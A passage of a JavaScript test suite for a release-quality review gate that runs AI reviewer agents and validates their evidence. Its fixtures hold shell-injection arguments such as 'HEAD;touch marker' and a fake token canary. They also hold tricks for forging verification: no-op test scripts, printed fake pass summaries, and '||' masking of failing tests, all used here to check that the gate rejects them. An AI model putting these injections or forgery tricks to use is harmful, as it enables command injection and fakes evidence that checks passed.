    const fakeBin = join(TEST_DIR, 'fake-bin-sequential-success');
    const leakMarker = join(TEST_DIR, 'sequential-success-descendant-leak');
    try {
      mkdirSync(fakeBin);
      const fakeCodex = join(fakeBin, 'codex');
      const reviewerDir = join(round, 'product-flow');
      const candidateCommit = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
      const candidateTree = spawnSync('git', ['rev-parse', 'HEAD^{tree}'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
      const descendantCode = `process.on('SIGTERM', () => {}); setTimeout(() => require('node:fs').writeFileSync(${JSON.stringify(leakMarker)}, 'survived'), 500)`;
      writeFileSync(fakeCodex, `#!/usr/bin/env node
const fs = process.getBuiltinModule('node:fs');
fs.mkdirSync(${JSON.stringify(reviewerDir)}, { recursive: true });
fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'result.yaml'))}, 'reviewer: product-flow\\nprofile: quick\\nround: ${roundNumber}\\ncandidate_commit: ${candidateCommit}\\ncandidate_tree: ${candidateTree}\\nscore: 95\\nstatus: pass\\nblockers: []\\nredlines: []\\n');
fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'score.md'))}, '# Score\\n\\n## Overall Score: 95/100\\n');
fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'blockers.md'))}, '# Blockers\\n\\nNo P0/P1 blockers.\\n');
fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'improvement-list.md'))}, '# Improvements\\n');
process.getBuiltinModule('node:child_process').spawn(process.execPath, ['-e', ${JSON.stringify(descendantCode)}], { stdio: 'ignore', env: process.env }).unref();
`);
      chmodSync(fakeCodex, 0o755);
      const result = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-runner.mjs'), '--profile', 'quick', '--agent', 'codex',
        '--reviewer', 'product-flow', '--round', String(roundNumber), '--skip-evidence',
      ], {
        cwd: PROJECT_ROOT, encoding: 'utf8', timeout: 5000,
        env: {
          ...process.env, PATH: `${fakeBin}:${process.env.PATH}`,
          RELEASE_QUALITY_REVIEWER_TIMEOUT_MS: '1000', RELEASE_QUALITY_REVIEWER_KILL_GRACE_MS: '100',
          RELEASE_QUALITY_REVIEWER_RETRY_MAX: '0', RELEASE_QUALITY_REVIEWER_START_DELAY_MS: '1',
        },
      });
      assertEqual(result.status, 1, `Expected failed Gate after reviewer completion, output: ${result.stdout}${result.stderr}`);
      spawnSync(process.execPath, ['-e', 'setTimeout(() => {}, 700)']);
      assertEqual(existsSync(leakMarker), false, 'Sequential successful reviewer descendants must be terminated');
    } finally {
      rmSync(round, { recursive: true, force: true });
    }
  });

  test('rejects synthetic auto review', () => {
    const result = spawnSync('node', [
      join(SKILL_DIR, 'scripts', 'review-runner.mjs'), '--auto', '--dry-run',
    ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
    assertEqual(result.status, 4);
  });

  test('review gate auto-detects a positive round when omitted', () => {
    const result = spawnSync('node', [
      join(SKILL_DIR, 'scripts', 'review-gate.mjs'), '--profile', 'quick', '--dry-run',
    ], { cwd: PROJECT_ROOT, encoding: 'utf8', timeout: 5000 });
    assertEqual(result.status, 0, `Expected successful dry run, output: ${result.stdout}${result.stderr}`);
    assertTrue(/Round:\s+\d+/.test(result.stdout), 'Expected an auto-detected positive round');
    assertEqual(result.stdout.includes('round-null'), false, 'Gate must never create round-null');
  });

  test('review gate rejects shell metacharacters in the diff base', () => {
    const marker = join(TEST_DIR, 'base-injection-marker');
    const result = spawnSync('node', [
      join(SKILL_DIR, 'scripts', 'review-gate.mjs'), '--profile', 'quick', '--dry-run',
      '--base', `HEAD;touch ${marker}`,
    ], { cwd: PROJECT_ROOT, encoding: 'utf8', timeout: 5000 });
    assertEqual(result.status, 4, `Expected invalid base failure, output: ${result.stdout}${result.stderr}`);
    assertEqual(existsSync(marker), false, 'Diff base must not reach a shell');
  });

  test('rejects review targets outside the repository', () => {
    const result = spawnSync('node', [
      join(SKILL_DIR, 'scripts', 'review-runner.mjs'), '--target', '../escaped;touch marker', '--dry-run',
    ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
    assertEqual(result.status, 4);
    assertEqual(existsSync(join(PROJECT_ROOT, 'marker')), false);
  });

  test('evidence validator rejects a bare command token with static references', () => {
    const roundNumber = TEST_ROUNDS.evidenceForgery;
    const round = reportRound(roundNumber);
    const reviewerDir = join(round, 'product-flow');
    const candidateCommit = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
    const candidateTree = spawnSync('git', ['rev-parse', 'HEAD^{tree}'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
    try {
      mkdirSync(reviewerDir, { recursive: true });
      writeFileSync(join(round, 'metadata.json'), JSON.stringify({
        candidate_commit: candidateCommit,
        candidate_tree: candidateTree,
      }));
      writeFileSync(join(reviewerDir, 'result.yaml'), `reviewer: product-flow\nprofile: quick\nround: ${roundNumber}\ncandidate_commit: ${candidateCommit}\ncandidate_tree: ${candidateTree}\nscore: 95\nstatus: pass\nblockers: []\nredlines: []\n`);
      writeFileSync(join(reviewerDir, 'score.md'), [
        '# Product Flow',
        '## Overall Score: 95/100',
        '功能正常。运行证据：npm test。',
        'skills/release-quality-review/scripts/evidence-validator.mjs:1',
        'skills/release-quality-review/scripts/review-gate.mjs:1',
        'skills/release-quality-review/scripts/review-runner.mjs:1',
        'skills/release-quality-review/lib/review-utils.mjs:1',
        'skills/release-quality-review/lib/security-utils.mjs:1',
      ].join('\n'));
      const result = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'evidence-validator.mjs'), '--round', `round-${String(roundNumber).padStart(3, '0')}`,
        '--reviewer', 'product-flow', '--base', 'HEAD',
      ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
      assertEqual(result.status, 1, `Expected forged evidence rejection, output: ${result.stdout}${result.stderr}`);
      assertTrue(result.stdout.includes('missing_evidence_output'),
        `Expected explicit missing command evidence violation, output: ${result.stdout}${result.stderr}`);

      writeFileSync(join(reviewerDir, 'score.md'), [
        '# Product Flow',
        '## Overall Score: 95/100',
        '测试通过。运行证据：npm test exit 0 metadata.json。',
        'skills/release-quality-review/scripts/evidence-validator.mjs:1',
        'skills/release-quality-review/scripts/review-gate.mjs:1',
        'skills/release-quality-review/scripts/review-runner.mjs:1',
        'skills/release-quality-review/lib/review-utils.mjs:1',
        'skills/release-quality-review/lib/security-utils.mjs:1',
      ].join('\n'));
      const markerResult = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'evidence-validator.mjs'), '--round', `round-${String(roundNumber).padStart(3, '0')}`,
        '--reviewer', 'product-flow', '--base', 'HEAD',
      ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
      assertEqual(markerResult.status, 1, `Expected fake bound marker rejection, output: ${markerResult.stdout}${markerResult.stderr}`);
      assertTrue(markerResult.stdout.includes('missing_evidence_output'), 'Expected fake bound marker violation');

      writeFileSync(join(reviewerDir, 'score.md'), [
        '# Product Flow',
        '## Overall Score: 95/100',
        'skills/release-quality-review/scripts/evidence-validator.mjs:1',
        'skills/release-quality-review/scripts/review-gate.mjs:1',
        'skills/release-quality-review/scripts/review-runner.mjs:1',
      ].join('\n'));
      const ratioResult = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'evidence-validator.mjs'), '--round', `round-${String(roundNumber).padStart(3, '0')}`,
        '--reviewer', 'product-flow', '--base', 'HEAD',
      ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
      assertEqual(ratioResult.status, 1, `Expected score ratio rejection, output: ${ratioResult.stdout}${ratioResult.stderr}`);
      assertTrue(ratioResult.stdout.includes('insufficient_evidence'), 'Expected score ratio not to count as test output');
    } finally {
      rmSync(round, { recursive: true, force: true });
    }
  });

  test('Gate and clean verifier reject explicit success no-op scripts', () => {
    const repository = join(TEST_DIR, 'trivial-verification-repository');
    const clone = spawnSync('git', ['clone', '--quiet', '--no-local', PROJECT_ROOT, repository], {
      cwd: TEST_DIR, encoding: 'utf8', timeout: 30000,
    });
    assertEqual(clone.status, 0, `Expected fixture clone, output: ${clone.stdout}${clone.stderr}`);
    const manifestPath = join(repository, 'package.json');
    const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'));
    manifest.scripts.test = 'env true';
    manifest.scripts.coverage = 'command sh -c true';
    manifest.scripts.typecheck = 'bash -lc true';
    manifest.scripts.build = 'exec true';
    manifest.scripts.lint = 'nice true';
    for (const name of ['skill:check-drift', 'skill:check', 'skill:verify']) manifest.scripts[name] = 'env true';
    writeFileSync(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`);
    spawnSync('git', ['config', 'user.email', 'test@example.invalid'], { cwd: repository, encoding: 'utf8' });
    spawnSync('git', ['config', 'user.name', 'Test'], { cwd: repository, encoding: 'utf8' });
    spawnSync('git', ['add', 'package.json'], { cwd: repository, encoding: 'utf8' });
    const commit = spawnSync('git', ['commit', '--quiet', '-m', 'forge verification scripts'], { cwd: repository, encoding: 'utf8' });
    assertEqual(commit.status, 0, `Expected fixture commit, output: ${commit.stdout}${commit.stderr}`);
    const fixtureBase = spawnSync('git', ['rev-parse', 'HEAD^'], { cwd: repository, encoding: 'utf8' }).stdout.trim();

    const gate = spawnSync(process.execPath, [
      join(SKILL_DIR, 'scripts', 'review-gate.mjs'), '--profile', 'quick', '--round', '1', '--base', fixtureBase,
    ], {
      cwd: repository,
      encoding: 'utf8',
      timeout: 30000,
      env: { ...process.env, RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED: '1' },
    });
    assertEqual(gate.status, 1, `Expected no-op Gate rejection, output: ${gate.stdout}${gate.stderr}`);
    assertTrue(gate.stdout.includes('trivial or missing verification scripts'), 'Gate must name script-integrity failure');

    const outputArg = join('quality-reports', 'round-002', 'evidence', 'clean-candidate.json');
    const output = join(repository, outputArg);
    const clean = spawnSync(process.execPath, [
      join(PROJECT_ROOT, 'scripts', 'verify-clean-candidate.mjs'), '--output', outputArg,
    ], {
      cwd: repository,
      encoding: 'utf8',
      timeout: 30000,
      env: { ...process.env, RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED: '1' },
    });
    assertEqual(clean.status, 1, `Expected no-op clean-verifier rejection, output: ${clean.stdout}${clean.stderr}`);
    assertTrue(existsSync(output), `Expected failed clean evidence, output: ${clean.stdout}${clean.stderr}`);
    const cleanEvidence = JSON.parse(readFileSync(output, 'utf8'));
    assertEqual(cleanEvidence.commands[1].id, 'script-integrity');
    assertEqual(cleanEvidence.commands[1].status, 'fail');
  });

  test('Gate and clean verifier reject candidate-authored Node summary printers', () => {
    const repository = join(TEST_DIR, 'fake-node-verifier-repository');
    const clone = spawnSync('git', ['clone', '--quiet', '--no-local', PROJECT_ROOT, repository], {
      cwd: TEST_DIR, encoding: 'utf8', timeout: 30000,
    });
    assertEqual(clone.status, 0, `Expected fixture clone, output: ${clone.stdout}${clone.stderr}`);
    const manifestPath = join(repository, 'package.json');
    const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'));
    manifest.scripts.test = 'node fake-verifier.mjs --test';
    manifest.scripts.coverage = 'node fake-verifier.mjs --test --experimental-test-coverage';
    writeFileSync(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`);
    writeFileSync(join(repository, 'fake-verifier.mjs'),
      "console.log('# tests 1\\n# fail 0\\n# start of coverage report');\n");
    spawnSync('git', ['config', 'user.email', 'test@example.invalid'], { cwd: repository, encoding: 'utf8' });
    spawnSync('git', ['config', 'user.name', 'Test'], { cwd: repository, encoding: 'utf8' });
    spawnSync('git', ['add', 'package.json', 'fake-verifier.mjs'], { cwd: repository, encoding: 'utf8' });
    const commit = spawnSync('git', ['commit', '--quiet', '-m', 'forge Node verification output'], {
      cwd: repository, encoding: 'utf8',
    });
    assertEqual(commit.status, 0, `Expected fixture commit, output: ${commit.stdout}${commit.stderr}`);
    const fixtureBase = spawnSync('git', ['rev-parse', 'HEAD^'], { cwd: repository, encoding: 'utf8' }).stdout.trim();

    const gate = spawnSync(process.execPath, [
      join(SKILL_DIR, 'scripts', 'review-gate.mjs'), '--profile', 'quick', '--round', '1', '--base', fixtureBase,
    ], {
      cwd: repository,
      encoding: 'utf8',
      timeout: 30000,
      env: { ...process.env, RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED: '1' },
    });
    assertEqual(gate.status, 1, `Expected forged Node Gate rejection, output: ${gate.stdout}${gate.stderr}`);
    assertTrue(gate.stdout.includes('trivial or missing verification scripts'), 'Gate must reject forged Node scripts');

    const outputArg = join('quality-reports', 'round-002', 'evidence', 'clean-candidate.json');
    const output = join(repository, outputArg);
    const clean = spawnSync(process.execPath, [
      join(PROJECT_ROOT, 'scripts', 'verify-clean-candidate.mjs'), '--output', outputArg,
    ], {
      cwd: repository,
      encoding: 'utf8',
      timeout: 30000,
      env: { ...process.env, RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED: '1' },
    });
    assertEqual(clean.status, 1, `Expected forged Node clean-verifier rejection, output: ${clean.stdout}${clean.stderr}`);
    const cleanEvidence = JSON.parse(readFileSync(output, 'utf8'));
    assertEqual(cleanEvidence.commands[1].id, 'script-integrity');
    assertEqual(cleanEvidence.commands[1].status, 'fail');
  });

  test('Gate and clean verifier reject masked runner failures with forged summaries', () => {
    const repository = join(TEST_DIR, 'masked-runner-failure-repository');
    const clone = spawnSync('git', ['clone', '--quiet', '--no-local', PROJECT_ROOT, repository], {
      cwd: TEST_DIR, encoding: 'utf8', timeout: 30000,
    });
    assertEqual(clone.status, 0, `Expected fixture clone, output: ${clone.stdout}${clone.stderr}`);
    const manifestPath = join(repository, 'package.json');
    const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'));
    manifest.scripts.test = 'node --test failing-verifier.test.mjs >/dev/null 2>&1 || node fake-verifier.mjs';
    manifest.scripts.coverage = 'node --experimental-test-coverage --test failing-verifier.test.mjs >/dev/null 2>&1 || node fake-verifier.mjs';
    writeFileSync(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`);
    writeFileSync(join(repository, 'failing-verifier.test.mjs'),
      "import test from 'node:test';\ntest('fixture fails', () => { throw new Error('expected'); });\n");
    writeFileSync(join(repository, 'fake-verifier.mjs'),
      "console.log('# tests 1\\n# fail 0\\n# start of coverage report');\n");
    spawnSync('git', ['config', 'user.email', 'test@example.invalid'], { cwd: repository, encoding: 'utf8' });
    spawnSync('git', ['config', 'user.name', 'Test'], { cwd: repository, encoding: 'utf8' });
    spawnSync('git', ['add', 'package.json', 'failing-verifier.test.mjs', 'fake-verifier.mjs'], {
      cwd: repository, encoding: 'utf8',
    });
    const commit = spawnSync('git', ['commit', '--quiet', '-m', 'mask runner failure'], {
      cwd: repository, encoding: 'utf8',
    });
    assertEqual(commit.status, 0, `Expected fixture commit, output: ${commit.stdout}${commit.stderr}`);
    const fixtureBase = spawnSync('git', ['rev-parse', 'HEAD^'], { cwd: repository, encoding: 'utf8' }).stdout.trim();

    const gate = spawnSync(process.execPath, [
      join(SKILL_DIR, 'scripts', 'review-gate.mjs'), '--profile', 'quick', '--round', '1', '--base', fixtureBase,
    ], {
      cwd: repository,
      encoding: 'utf8',
      timeout: 30000,
      env: { ...process.env, RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED: '1' },
    });
    assertEqual(gate.status, 1, `Expected masked-failure Gate rejection, output: ${gate.stdout}${gate.stderr}`);
    assertTrue(gate.stdout.includes('trivial or missing verification scripts'), 'Gate must reject masking operators');

    const outputArg = join('quality-reports', 'round-002', 'evidence', 'clean-candidate.json');
    const output = join(repository, outputArg);
    const clean = spawnSync(process.execPath, [
      join(PROJECT_ROOT, 'scripts', 'verify-clean-candidate.mjs'), '--output', outputArg,
    ], {
      cwd: repository,
      encoding: 'utf8',
      timeout: 30000,
      env: { ...process.env, RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED: '1' },
    });
    assertEqual(clean.status, 1, `Expected masked-failure clean rejection, output: ${clean.stdout}${clean.stderr}`);
    const cleanEvidence = JSON.parse(readFileSync(output, 'utf8'));
    assertEqual(cleanEvidence.commands[1].status, 'fail');
  });

  test('keeps blockers.md veto even when result.yaml claims pass', () => {
    const roundNumber = TEST_ROUNDS.veto;
    const round = reportRound(roundNumber);
    const candidateCommit = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
    const candidateTree = spawnSync('git', ['rev-parse', 'HEAD^{tree}'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
    for (const reviewer of ['product-flow', 'architecture-maintainer']) {
      const dir = join(round, reviewer);
      mkdirSync(dir, { recursive: true });
      writeFileSync(join(dir, 'result.yaml'), `reviewer: ${reviewer}\nprofile: quick\nround: ${roundNumber}\ncandidate_commit: ${candidateCommit}\ncandidate_tree: ${candidateTree}\nscore: 100\nstatus: pass\nblockers: []\nredlines: []\n`);
      writeFileSync(join(dir, 'score.md'), `# ${reviewer}\n\n## Overall Score: 100/100\n`);
      writeFileSync(join(dir, 'blockers.md'), reviewer === 'product-flow'
        ? '# Blockers\n\n## P1 — veto must survive\n\nEvidence: reproducible\n'
        : '# Blockers\n\nNo P0/P1 blockers.\n');
      writeFileSync(join(dir, 'improvement-list.md'), '# Improvements\n');
    }
    try {
      const result = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-gate.mjs'), '--profile', 'quick', '--round', String(roundNumber),
        '--no-collect', '--no-validate-evidence',
      ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
      assertEqual(result.status, 1);
      assertTrue(result.stdout.includes('GATE FAILED'), 'Expected a failed gate verdict');
      const summary = readFileSync(join(round, 'summary.md'), 'utf8');
      assertTrue(summary.includes('| product-flow | 100/100 | ❌ FAIL |'), 'Summary must not convert a blocker-bearing score into PASS');
    } finally {
      rmSync(round, { recursive: true, force: true });
    }
  });

  test('E2E normal runner workflow writes every prompt and metadata without crashing', () => {
    const roundNumber = TEST_ROUNDS.runner;
    const round = reportRound(roundNumber);
    const fakeBin = join(TEST_DIR, 'fake-bin-runner');
    try {
      mkdirSync(fakeBin);
      const fakeCodex = join(fakeBin, 'codex');
      writeFileSync(fakeCodex, `#!/usr/bin/env node
if (process.argv.includes('--help')) process.exit(0);
if (!process.argv.includes('exec')) process.exit(3);
console.log('review completed');
`);
      chmodSync(fakeCodex, 0o755);
      const result = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-runner.mjs'), '--profile', 'quick', '--agent', 'codex',
        '--round', String(roundNumber), '--skip-evidence',
      ], {
        cwd: PROJECT_ROOT,
        encoding: 'utf8',
        timeout: 30000,
        env: {
          ...process.env,
          PATH: `${fakeBin}:${process.env.PATH}`,
          RELEASE_QUALITY_REVIEWER_RETRY_MAX: '0',
          RELEASE_QUALITY_REVIEWER_START_DELAY_MS: '1',
        },
      });
      assertEqual(result.status, 5, `Expected malformed reviewer failure, output: ${result.stdout}${result.stderr}`);
      assertEqual(result.stderr.includes('results is not defined'), false);
      assertEqual(existsSync(join(round, 'runner-metadata.json')), true);
      assertEqual(existsSync(join(round, 'product-flow', 'prompt.md')), true);
      assertEqual(existsSync(join(round, 'architecture-maintainer', 'prompt.md')), true);
      const rerun = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-runner.mjs'), '--profile', 'quick', '--agent', 'codex',
        '--round', String(roundNumber), '--skip-evidence',
      ], {
        cwd: PROJECT_ROOT,
        encoding: 'utf8',
        timeout: 30000,
        env: {
          ...process.env,
          PATH: `${fakeBin}:${process.env.PATH}`,
          RELEASE_QUALITY_REVIEWER_RETRY_MAX: '0',
          RELEASE_QUALITY_REVIEWER_START_DELAY_MS: '1',
        },
      });
      assertEqual(rerun.status, 5);
      assertTrue(rerun.stdout.includes('invalidating stale artifacts'), 'Malformed packet must be relaunched');
      assertEqual(rerun.stdout.includes('validated resume'), false, 'Malformed packet must never be resumed');

      const fakeClaude = join(fakeBin, 'claude');
      writeFileSync(fakeClaude, `#!/usr/bin/env node
if (process.argv.includes('--help') || process.argv.includes('--version')) process.exit(0);
process.exit(3);
`);
      chmodSync(fakeClaude, 0o755);
      const mixedBackend = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-runner.mjs'), '--profile', 'quick', '--agent', 'claude',
        '--round', String(roundNumber), '--skip-evidence',
      ], {
        cwd: PROJECT_ROOT,
        encoding: 'utf8',
        timeout: 30000,
        env: { ...process.env, PATH: `${fakeBin}:${process.env.PATH}` },
      });
      assertEqual(mixedBackend.status, 4, `Expected backend-mixing rejection: ${mixedBackend.stdout}${mixedBackend.stderr}`);
      assertTrue(mixedBackend.stderr.includes('round backend is locked to codex, cannot use claude'));
    } finally {
      rmSync(round, { recursive: true, force: true });
    }
  });

  test('E2E agentic skip-evidence preserves candidate-bound phase scope', () => {
    const roundNumber = TEST_ROUNDS.runner + 200;
    const round = reportRound(roundNumber);
    const fakeBin = join(TEST_DIR, 'fake-bin-agentic-scope');
    const reviewerDir = join(round, 'product-flow');
    const candidateCommit = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
    const candidateTree = spawnSync('git', ['rev-parse', 'HEAD^{tree}'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
    try {
      mkdirSync(fakeBin);
      mkdirSync(round, { recursive: true });
      writeFileSync(join(round, 'metadata.json'), JSON.stringify({
        profile: 'agentic-release-gate', round: roundNumber, collected_at: new Date().toISOString(),
        git: { branch: 'test', commit: candidateCommit.slice(0, 8), status: '', diff: '+ changed\n- old', changedFiles: ['a.mjs', 'b.mjs'] },
        files: {}, scale: { scale: 'small', files: 2, additions: 1, deletions: 1, total: 2 },
        candidate_commit: candidateCommit, candidate_tree: candidateTree,
        base_commit: candidateCommit, base_tree: candidateTree,
      }));
      const fakeCodex = join(fakeBin, 'codex');
      writeFileSync(fakeCodex, `#!/usr/bin/env node
if (process.argv.includes('--help') || process.argv.includes('--version')) process.exit(0);
const fs = process.getBuiltinModule('node:fs');
fs.mkdirSync(${JSON.stringify(reviewerDir)}, { recursive: true });
fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'result.yaml'))}, 'reviewer: product-flow\\nprofile: agentic-release-gate\\nround: ${roundNumber}\\ncandidate_commit: ${candidateCommit}\\ncandidate_tree: ${candidateTree}\\nscore: 95\\nstatus: pass\\nblockers: []\\nredlines: []\\n');
fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'score.md'))}, '# Score\\n\\n## Overall Score: 95/100\\n');
fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'blockers.md'))}, '# Blockers\\n\\nNo P0/P1 blockers.\\n');
fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'improvement-list.md'))}, '# Improvements\\n');
`);
      chmodSync(fakeCodex, 0o755);
      const result = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-runner.mjs'), '--profile', 'agentic-release-gate',
        '--agent', 'codex', '--reviewer', 'product-flow', '--round', String(roundNumber),
        '--base', candidateCommit, '--skip-evidence',
      ], {
        cwd: PROJECT_ROOT, encoding: 'utf8', timeout: 10000,
        env: {
          ...process.env, PATH: `${fakeBin}:${process.env.PATH}`,
          RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED: '1', RELEASE_QUALITY_REVIEWER_RETRY_MAX: '0',
        },
      });
      assertEqual(result.status, 1, `${result.stdout}${result.stderr}`);
      const plan = readFileSync(join(round, `phase-${roundNumber}-plan.md`), 'utf8');
      assertTrue(plan.includes('small (2 files, 2 lines)'));
      assertTrue(plan.includes('Changed files:** 2'));
      assertTrue(plan.includes(`Git commit:** ${candidateCommit.slice(0, 8)}`));
    } finally {
      rmSync(round, { recursive: true, force: true });
    }
  });

  test('E2E no-collect rehydrates matching evidence and quick final report avoids agentic claims', () => {
    const roundNumber = TEST_ROUNDS.rehydrate;
    const round = reportRound(roundNumber);
    const finalReport = join(round, 'final-report.md');
    const commit = spawnSync('git', ['rev-parse', '--short=8', 'HEAD'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
    const fullCommit = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
    const tree = spawnSync('git', ['rev-parse', 'HEAD^{tree}'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
    const status = spawnSync('git', ['status', '--short'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
    try {
      for (const reviewer of ['product-flow', 'architecture-maintainer']) {
        const dir = join(round, reviewer);
        mkdirSync(dir, { recursive: true });
        writeFileSync(join(dir, 'result.yaml'), `reviewer: ${reviewer}\nprofile: quick\nround: ${roundNumber}\ncandidate_commit: ${fullCommit}\ncandidate_tree: ${tree}\nscore: 95\nstatus: pass\nblockers: []\nredlines: []\n`);
        writeFileSync(join(dir, 'score.md'), `# ${reviewer}\n\n## Overall Score: 95/100\n`);
        writeFileSync(join(dir, 'blockers.md'), '# Blockers\n\nNo P0/P1 blockers.\n');
        writeFileSync(join(dir, 'improvement-list.md'), '# Improvements\n');
      }
      mkdirSync(join(round, 'evidence'), { recursive: true });
      const commandRecord = (command, statusValue, exitCode, output) => ({
        command, started_at: new Date().toISOString(), finished_at: new Date().toISOString(),
        status: statusValue, exit_code: exitCode, output, output_bytes: Buffer.byteLength(output), truncated: false,
      });
      const testCheck = commandRecord('npm test', 'pass', 0, '# tests 1\n# fail 0');
      const typecheckCheck = commandRecord('npm run typecheck', 'pass', 0, 'passed');
      const checkoutIdentity = { commit: fullCommit, tree, status: '' };
      const automatedContent = JSON.stringify({
        testGate: testCheck, typecheckGate: typecheckCheck,
        buildGate: commandRecord('npm run build', 'fail', 1, 'optional failure'),
        lintGate: commandRecord('npm run lint', 'fail', 1, 'optional failure'),
        auditGate: commandRecord('npm audit --audit-level=high', 'fail', 1, 'optional failure'),
        secrets: { status: 'fail', issues: ['optional scan failure'] }, oversizedFiles: { status: 'pass', issues: [] },
        circularDeps: { status: 'pass', issues: [] },
        candidateCheckout: {
          status: 'pass', source_commit: fullCommit, source_tree: tree,
          initial: checkoutIdentity, final: checkoutIdentity,
        },
      });
      writeFileSync(join(round, 'evidence', 'automated-checks.json'), automatedContent);
      writeFileSync(join(round, 'metadata.json'), JSON.stringify({
        profile: 'quick', round: roundNumber, collected_at: new Date().toISOString(),
        git: { commit, status, branch: 'test', changedFiles: ['README.md'] }, files: {},
        scale: { scale: 'micro', files: 1, total: 2 },
        candidate_commit: fullCommit, candidate_tree: tree,
        base_commit: fullCommit, base_tree: tree,
        automated_checks_sha256: createHash('sha256').update(automatedContent).digest('hex'),
      }));
      const result = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-gate.mjs'), '--profile', 'quick', '--round', String(roundNumber),
        '--no-collect', '--no-validate-evidence',
      ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
      assertEqual(result.status, 0, `Expected no-collect pass, output: ${result.stdout}${result.stderr}`);
      assertTrue(result.stdout.includes('Loaded persisted automated evidence'), 'Expected persisted evidence rehydration');
      assertEqual(existsSync(join(round, `phase-${roundNumber}-plan.md`)), true, 'Expected Gate-owned phase plan');
      const phasePlan = readFileSync(join(round, `phase-${roundNumber}-plan.md`), 'utf8');
      assertTrue(phasePlan.includes('micro (1 files, 2 lines)'), 'Phase plan must preserve persisted scale');
      assertTrue(phasePlan.includes('Changed files:** 1'), 'Phase plan must preserve persisted changed-file count');
      const report = readFileSync(finalReport, 'utf8');
      assertEqual(report.includes('Clean-candidate verification passed'), false);
      assertEqual(report.includes('Goal instruction validation passed'), false);
      assertEqual(report.includes('Build, lint, audit'), false);

      rmSync(finalReport, { force: true });
      mkdirSync(finalReport);
      const unwritableFinal = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-gate.mjs'), '--profile', 'quick', '--round', String(roundNumber),
        '--no-collect', '--no-validate-evidence',
      ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
      assertTrue(unwritableFinal.status !== 0, 'Expected final report persistence failure');
      const arbitration = JSON.parse(readFileSync(join(round, 'evidence', 'final-arbitration.json'), 'utf8'));
      assertTrue(arbitration.status !== 'pass', 'Pass arbitration must not precede durable final artifacts');
      rmSync(finalReport, { recursive: true, force: true });

      const packetPath = join(round, 'product-flow', 'result.yaml');
      const packetContent = readFileSync(packetPath, 'utf8');
      const substitutedPacket = join(TEST_DIR, 'substituted-result.yaml');
      writeFileSync(substitutedPacket, packetContent);
      rmSync(packetPath);
      symlinkSync(substitutedPacket, packetPath);
      const packetSymlink = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-gate.mjs'), '--profile', 'quick', '--round', String(roundNumber),
        '--no-collect', '--no-validate-evidence',
      ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
      assertEqual(packetSymlink.status, 1);
      assertTrue(packetSymlink.stdout.includes('Invalid reviewers detected'), 'Expected symlinked packet rejection');
      rmSync(packetPath);
      writeFileSync(packetPath, packetContent);

      const improvementPath = join(round, 'product-flow', 'improvement-list.md');
      const improvementContent = readFileSync(improvementPath, 'utf8');
      const secretCanary = ['ghp', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234'].join('_');
      writeFileSync(improvementPath, `${improvementContent}\n${secretCanary}\n`);
      const sensitivePacket = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-gate.mjs'), '--profile', 'quick', '--round', String(roundNumber),
        '--no-collect', '--no-validate-evidence',
      ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
      assertEqual(sensitivePacket.status, 1);
      assertTrue(sensitivePacket.stdout.includes('Generated artifact security scan failed'),
        'Expected sensitive reviewer packet rejection');
